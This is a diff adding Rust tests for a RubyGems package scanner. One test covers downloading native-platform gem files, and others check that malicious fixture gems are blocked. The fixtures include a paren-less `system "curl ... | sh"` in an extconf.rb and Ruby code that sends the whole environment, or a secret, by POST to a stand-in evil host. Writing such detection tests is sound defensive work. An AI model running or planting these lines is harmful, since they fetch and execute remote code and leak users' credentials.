@@ -102,6 +102,59 @@ fn gemspec(name: &str, version: &str, extra: &str) -> String {
 }
 
 #[test]
+fn native_platform_gem_downloads_platform_filename() {
+    // RubyGems can return multiple entries with the SAME `number` but different
+    // platforms; here the chosen (only, hence default-resolved) entry is a
+    // native `x86_64-linux` build. Its `sha` belongs to the
+    // `NAME-VERSION-PLATFORM.gem` artifact, so the resolver MUST request
+    // `nativegem-1.0.0-x86_64-linux.gem`, not `nativegem-1.0.0.gem`.
+    //
+    // We register the gem bytes ONLY under the platform-qualified URL. If the
+    // resolver ignored `platform` (the bug), it would request the plain
+    // filename, MockTransport would 404, and the scan would error. A successful
+    // scan therefore proves the platform is in the filename.
+    let registry = "https://rubygems.org";
+    let name = "nativegem";
+    let version = "1.0.0";
+    let platform = "x86_64-linux";
+
+    let spec = gemspec(name, version, "extensions: []\n");
+    let gem = make_gem(&spec, &[("lib/nativegem.rb", b"module Nativegem; end\n")]);
+
+    let versions_url = format!("{registry}/api/v1/versions/{name}.json");
+    let plain_url = format!("{registry}/downloads/{name}-{version}.gem");
+    let platform_url = format!("{registry}/downloads/{name}-{version}-{platform}.gem");
+
+    let transport = MockTransport::new();
+    transport.insert(
+        &versions_url,
+        format!(
+            r#"[{{"number": "{version}", "sha": "{}", "platform": "{platform}", "prerelease": false}}]"#,
+            sha256_hex(&gem)
+        )
+        .into_bytes(),
+    );
+    // Only the platform-qualified URL serves the gem. The plain URL serves
+    // garbage that would fail SHA verification if the resolver requested it.
+    transport.insert(&plain_url, b"WRONG ARTIFACT".to_vec());
+    transport.insert(&platform_url, gem);
+
+    let opts = GemFetchOptions::default();
+    let pkg = GemRef::parse(name).unwrap();
+    let report = fetch_and_scan_gems(&pkg, &opts, &transport)
+        .expect("native-platform gem must download the platform-qualified filename and verify");
+
+    assert_eq!(report.package_name.as_deref(), Some(name));
+    assert_eq!(report.package_version.as_deref(), Some(version));
+    assert_eq!(
+        report.decision,
+        Decision::Allow,
+        "findings: {:?}",
+        report.findings
+    );
+}
+
+#[test]
 fn malicious_extconf_subprocess_blocks() {
     let spec = gemspec("evilgem", "1.0.0", "extensions:\n- ext/foo/extconf.rb\n");
     let extconf = br#"
@@ -121,6 +174,32 @@ create_makefile('foo/foo')
     let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
     assert!(ids.contains(&"native-extension"), "got: {ids:?}");
     assert!(ids.contains(&"extconf-subprocess"), "got: {ids:?}");
+    assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn malicious_extconf_parenless_subprocess_blocks() {
+    // Ruby allows paren-less calls: `system "curl ... | sh"` with no `(`.
+    // The original regex required `system(`, so this real attack shape slipped
+    // through. It must now fire extconf-subprocess and Block.
+    let spec = gemspec("parenless", "1.0.0", "extensions:\n- ext/foo/extconf.rb\n");
+    let extconf = br#"
+require 'mkmf'
+system "curl http://evil.example.invalid/p.sh | sh"
+create_makefile('foo/foo')
+"#;
+    let gem = make_gem(
+        &spec,
+        &[
+            ("lib/parenless.rb", b"module Parenless; end\n"),
+            ("ext/foo/extconf.rb", extconf),
+        ],
+    );
+    let report = scan_gem_fixture("parenless", "1.0.0", gem).unwrap();
+
+    let ids: Vec<&str> = report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(ids.contains(&"extconf-subprocess"), "got: {ids:?}");
+    assert!(ids.contains(&"native-extension"), "got: {ids:?}");
     assert_eq!(report.decision, Decision::Block);
 }
 
@@ -277,6 +356,51 @@ Net::HTTP.post(URI('https://evil.example.invalid/collect'), secret)
     );
     // A real exfil pattern must block.
     assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn bulk_env_dump_harvester_blocks() {
+    // A gem that dumps the ENTIRE environment (ENV.to_h) and POSTs it out. No
+    // ENV name contains TOKEN/SECRET/KEY, so the credential-name regex alone
+    // would miss it — the bulk-ENV companion regex must fire
+    // gem-env-token-exfil because a whole-env sweep + network egress is the
+    // harvester pattern.
+    let spec = gemspec("bulkharvest", "1.0.0", "extensions: []\n");
+    let ruby = br#"
+require 'net/http'
+all_env = ENV.to_h
+Net::HTTP.post(URI('https://evil.example.invalid/collect'), all_env.to_json)
+"#;
+    let gem = make_gem(&spec, &[("lib/bulkharvest.rb", ruby)]);
+    let report = scan_gem_fixture("bulkharvest", "1.0.0", gem).unwrap();
+    let ids: std::collections::BTreeSet<&str> =
+        report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(
+        ids.contains("gem-env-token-exfil"),
+        "expected gem-env-token-exfil (bulk ENV dump + network egress), got: {ids:?}"
+    );
+    assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn benign_single_env_read_does_not_harvest() {
+    // A benign gem that reads ONE non-credential env var (ENV['HOME']) and does
+    // network work must NOT fire gem-env-token-exfil: neither the
+    // credential-name nor the bulk-dump idiom is present.
+    let spec = gemspec("benignenv", "1.0.0", "extensions: []\n");
+    let ruby = br#"
+require 'net/http'
+home = ENV['HOME']
+puts "config dir: #{home}/.benignenv"
+"#;
+    let gem = make_gem(&spec, &[("lib/benignenv.rb", ruby)]);
+    let report = scan_gem_fixture("benignenv", "1.0.0", gem).unwrap();
+    let ids: std::collections::BTreeSet<&str> =
+        report.findings.iter().map(|f| f.rule_id.as_str()).collect();
+    assert!(
+        !ids.contains("gem-env-token-exfil"),
+        "benign ENV['HOME'] read must NOT fire gem-env-token-exfil, got: {ids:?}"
+    );
 }
 
 #[test]
